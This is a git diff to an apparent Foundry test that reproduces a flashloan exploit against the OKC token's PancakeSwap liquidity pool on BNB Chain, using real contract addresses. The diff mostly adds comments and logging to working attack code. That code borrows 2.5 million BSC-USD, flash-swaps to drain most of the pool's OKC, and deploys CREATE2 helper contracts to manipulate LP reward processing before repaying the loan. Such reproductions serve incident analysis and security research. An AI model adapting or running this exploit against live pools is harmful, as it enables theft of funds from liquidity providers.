@@ -31,11 +31,11 @@ contract ExploitHelper {
     address PANCAKELP = 0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96;
 
     constructor() payable {
-        // transfer all BSC-USD to PANCAKELP
+        // on deploy transfer all BSC-USD to PANCAKELP
         uint256 bscusd_balance = IERC20(BSCUSD).balanceOf(address(this));
         IERC20(BSCUSD).transfer(PANCAKELP, bscusd_balance); 
 
-        // transfer all OKC to PANCAKELP
+        // on deploy transfer all OKC to PANCAKELP
         uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
         IERC20(OKC).transfer(PANCAKELP, okc_balance);
     }
@@ -222,7 +222,7 @@ contract OKCProcessLpRewardExploit is Test {
 
     }
 
-    // PancakeV3 flashloan callback (generally used to payback the loan probably)
+    // PancakeV3 flashloan callback. Generally used to payback the loan
     function pancakeV3FlashCallback(
         uint256 fee0, // will be 2500000000000000000000000
         uint256 fee1, // will be 0
@@ -235,26 +235,43 @@ contract OKCProcessLpRewardExploit is Test {
       address[] memory path = new address[](2);
       path[0] = BSCUSD;
       path[1] = OKC;
-
+      /*
+      Given an input asset amount and an array of token addresses, calculates all subsequent maximum output token amounts by 
+      calling getReserves for each pair of token addresses in the path in turn, and using these to call getAmountOut.
+      Useful for calculating optimal token amounts before calling swap.
+      get amount of OKC to receive for 130000000000000000000000 BSC-USD
+      the amount you provide is assumed to be of path[0] and the amount you will receive is of path[1]
+      */
       uint[] memory amountOut = IPancakeRouter01(PANCAKEROUTER).getAmountsOut(attack_uint256_2, path);
       console2.log("Amount of OKC to swap for:", amountOut[1]);
 
-      //function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
-      //Swap all the flashloaned BSC-USD for OKC
-      IPancakePair(PANCAKELP).swap(1, amountOut[1], address(this), abi.encode(attack_uint256_2));
+      uint256 lpOkcBalance = IERC20(OKC).balanceOf(PANCAKELP);
+      console2.log("PANCAKELP OKC Balance:", lpOkcBalance);
 
-      // Transfer OKC to exploitHelperOne address before deploying contract to address.
+      // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+      // https://docs.uniswap.org/contracts/v2/concepts/core-concepts/flash-swaps
+      // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
+      // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#swap-1
+      // https://www.rareskills.io/post/uniswap-v2-swap-function
+      // flashswap/loan 1 BSC-USD and 386818228002321477291844 OKC from PANCAKELP
+      // this should drain the LP of most of its OKC liquidity
+      IPancakePair(PANCAKELP).swap(1, amountOut[1], address(this), abi.encode(attack_uint256_2));
+      // uses the swap callback to provide the amountIn for the flashLoan
+
+      bytes memory createCode = type(ExploitHelper).creationCode;
+
+      // Transfer 10000000000000000 OKC to exploitHelperOne before deploying contract.
+      // This will have the exploitHelperOne send the BSC-USD to the PANCAKELP contract.
       console2.log("Transfer 10000000000000000 OKC to exploitHelperOne address.");
       IERC20(OKC).transfer(exploitHelperOne, 10000000000000000);
 
-      bytes memory createCode = type(ExploitHelper).creationCode;
       // Deploy exploitHelperOne 
       console2.log("Deploy exploitHelperOne w/ Create2 to address.");
-
       address createdOne = create2address(createCode, bytes32("fuck"));
       require(createdOne == exploitHelperOne, "create2 first deploy address mismatch");
 
       // Transfer 100000000000000 BSC-USD to exploitHelperTwo before deploying contract.
+      // This will have the exploitHelperTwo send the BSC-USD to the PANCAKELP contract.
       console2.log("Transfer 100000000000000 BSC-USD to exploitHelperTwo address.");
       IERC20(BSCUSD).transfer(exploitHelperTwo, 100000000000000);
 
@@ -262,20 +279,24 @@ contract OKCProcessLpRewardExploit is Test {
       console2.log("Transfer 1 OKC to exploitHelperTwo address.");
       IERC20(OKC).transfer(exploitHelperTwo, 1);
 
-
       // Deploy exploitHelperTwo
       console2.log("Deploy exploitHelperTwo w/ Create2 to address.");
-
       address createdTwo = create2address(createCode, bytes32("shit"));
-
       require(createdTwo == exploitHelperTwo, "create2 second deploy address mismatch");
 
+      console2.log("calling getReserves()");
+      // get reserves of token0 and token1
       (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IPancakePair(PANCAKELP).getReserves();
+      console2.log("PANCAKELP reserve0 %d", reserve0);
+      console2.log("PANCAKELP reserve1 %d", reserve1);
 
-      // get OKC balance
+      // get OKC balance of this contract
       uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
+      console2.log("Current OKC Balance: %d", okc_balance);
 
+      // rareskills
       uint total = IPancakeRouter01(PANCAKEROUTER).quote(okc_balance, reserve1, reserve0);
+      console2.log("liquidity quote(): %d", total);
       // Transfer BSC-USD to PANCAKELP
       IERC20(BSCUSD).transfer(PANCAKELP, total);
 
@@ -333,13 +354,13 @@ contract OKCProcessLpRewardExploit is Test {
         block.timestamp
       );
 
-      // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL paying back the 2.5m flashloan. 
+      // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL paying back the 2.5m flashloan + fee. 
       IERC20(BSCUSD).transfer(PANCAKEV3POOL, 2500250000000000000000000);
     }
 
     // Pancake swap callback
     function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
-      // transfer BSC-USD to PANCAKELP
+      // transfer 130000000000000000000000 BSC-USD to PANCAKELP to use as amountIn for the flashloan/flashSwap
       IERC20(BSCUSD).transfer(PANCAKELP, abi.decode(data, (uint256)));
     }
 
